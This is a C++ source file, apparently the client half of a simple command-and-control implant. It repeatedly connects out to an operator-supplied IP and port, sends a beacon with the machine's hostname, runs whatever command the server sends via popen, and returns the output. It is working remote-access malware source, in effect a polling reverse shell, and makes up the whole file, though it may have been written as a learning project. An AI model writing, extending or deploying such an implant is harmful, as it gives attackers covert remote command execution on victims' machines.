#include <cstdio>
#include <iostream>
#include <string>
#include <cstring>
#include <thread>
#include <chrono>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <atomic>
#include <unordered_set>
#include "utils.h"

using namespace std;

string clientHostname{};
unordered_set<string> seenIPs;

// this will attempt to connect to our listening server
int connect_to_server(const string& ip, int port)
{
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd == -1)
    {
        cout << "[client] Socket creation failed." << endl;
        return -1;
    }

    sockaddr_in clientAddr;
    clientAddr.sin_family = AF_INET;
    clientAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &clientAddr.sin_addr);

    socklen_t sizeClient = sizeof(clientAddr);

    int connAttempt = connect(sockfd, reinterpret_cast<sockaddr*>(&clientAddr), sizeClient);

    if (connAttempt == -1)
    {
        close(sockfd);
        return -1;
    }

    return sockfd;
}

// this straightforwardly executes any given command
string execute(const string& command)
{
    string output = "";

    FILE* process = popen(command.data(), "r");

    if (process == nullptr)
    {
        return "EXEC_ERROR";
    }

    char buffer[256];

    while (fgets(buffer, sizeof(buffer), process) != NULL)
    {
        output += buffer;
    }

    pclose(process);
    return output;
}

// this handles anything we're outputing
void outputing(const string& ip, int port, atomic<bool>& running)
{
    while (running)
    {
        int connfd = connect_to_server(ip, port);

        if (connfd == -1)
        {
            cout << "[client] Couldn't Connect." << endl;
            this_thread::sleep_for(chrono::seconds(5));
            continue;
        }
        else
        {
            if (seenIPs.find(ip) == seenIPs.end())
            {
                cout << "[client] connected to [" << ip << "] on port [" << port << "]" << endl;
                seenIPs.insert(ip);
            }
        }

        // after connecting, we check if there's an available command
        cout << "[client] Checking Queue." << endl;
        string cmd = recv_all(connfd);

        if (cmd != "NOP")
        {
            cout << "[client] Executing Command: " << cmd << endl;
            string output = execute(cmd);

            if (output == "EXEC_ERROR")
            {
                send_all(connfd, "[client] Couldn't Execute Command.");
            }
            else
            {
                send_all(connfd, output);
            }
        }
        else
        {
            string beaconMsg = "[client] NOP. Beacon from [" + clientHostname + "].";
            send_all(connfd, beaconMsg);
            cout << "[client] Sent Beacon." << endl;
        }

        close(connfd);

        this_thread::sleep_for(chrono::seconds(5)); // waiting before checking again. during this, commands might be pushed
    }
}

int main(int argc, char* argv[])
{
    int port{};
    string ip{};

    if (argc > 2)
    {
        try {
            port = stoi(argv[2]);
            ip = argv[1];
        } catch (const invalid_argument& problem) {
            cout << problem.what() << endl;
            return -1;
        } catch (const out_of_range& problem) {
            cout << problem.what() << endl;
            return -1;
        }
    }
    else
    {
        cout << "No IP/Port Arguments Passed (e.g., ./client 192.168.1.2 1234). Launching Interactive Mode." << endl;
        cout << "Provide Server IP: ";
        cin >> ip;
        cin.ignore();
        cout << "Provide Port: ";
        cin >> port;
        cin.ignore();
    }

    atomic<bool> running = true;

    // this is so that we can send out our hostname with each beacon, so the server has more clarity
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    clientHostname = hostname;

    thread outputThread(outputing, ref(ip), port, ref(running));

    // wait here
    outputThread.join();
}